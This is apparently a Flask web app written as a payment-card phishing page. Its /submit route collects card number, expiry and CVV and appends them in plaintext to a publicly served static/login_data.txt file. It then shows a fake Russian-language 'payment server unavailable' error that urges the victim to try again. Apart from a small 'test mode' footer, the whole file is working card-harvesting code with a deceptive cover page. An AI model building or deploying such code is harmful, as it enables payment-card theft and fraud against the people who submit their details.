
from flask import Flask, request, render_template
import os

app = Flask(__name__)


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/submit', methods=['POST'])
def submit():
    card_number = request.form.get('card_number', '')
    expiry = request.form.get('expiry', '')
    cvv = request.form.get('cvv', '')

    os.makedirs('static', exist_ok=True)

    file_path = os.path.join('static', 'login_data.txt')

    with open(file_path, 'a', encoding='utf-8') as f:
        f.write(f"Card: {card_number} | Expiry: {expiry}\n | CVV: {cvv}")

    return """
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Ошибка оплаты</title>

        <script src="https://cdn.tailwindcss.com"></script>
    </head>

    <body class="min-h-screen bg-gray-50 flex items-center justify-center p-4">

        <div class="w-full max-w-md">

            <div class="bg-white rounded-2xl shadow-lg border border-gray-100 p-8 text-center">

                <div class="mx-auto mb-6 w-16 h-16 rounded-full bg-red-100 flex items-center justify-center">

                    <svg
                        class="w-8 h-8 text-red-600"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        viewBox="0 0 24 24"
                    >
                        <path
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            d="M12 9v4m0 4h.01M10.29 3.86l-8.1 14a2 2 0 001.73 3h16.16a2 2 0 001.73-3l-8.1-14a2 2 0 00-3.42 0z"
                        />
                    </svg>

                </div>

                <h1 class="text-2xl font-bold text-gray-900 mb-3">
                    Сервер не отвечает
                </h1>

                <p class="text-gray-500 leading-relaxed mb-6">
                    Не удалось связаться с платёжным сервером.
                    Платёж не был завершён.
                    Пожалуйста, попробуйте повторить попытку позже.
                </p>

                <div class="bg-red-50 border border-red-100 rounded-xl p-4 mb-6">

                    <p class="text-sm text-red-700">
                        <span class="font-semibold">
                            Ошибка соединения:
                        </span>
                        платёжный сервер временно недоступен.
                    </p>

                </div>

                <a
                    href="/"
                    class="block w-full bg-[#0066FF] hover:bg-blue-700 text-white font-semibold py-3.5 px-4 rounded-xl transition-all"
                >
                    Вернуться к оплате
                </a>

            </div>

            <p class="text-center text-xs text-gray-400 mt-5">
                Тестовый режим • Платёж не был произведён
            </p>

        </div>

    </body>
    </html>
    """


if __name__ == '__main__':
    app.run(
        host='127.0.0.1',
        port=5000,
        debug=True
    )
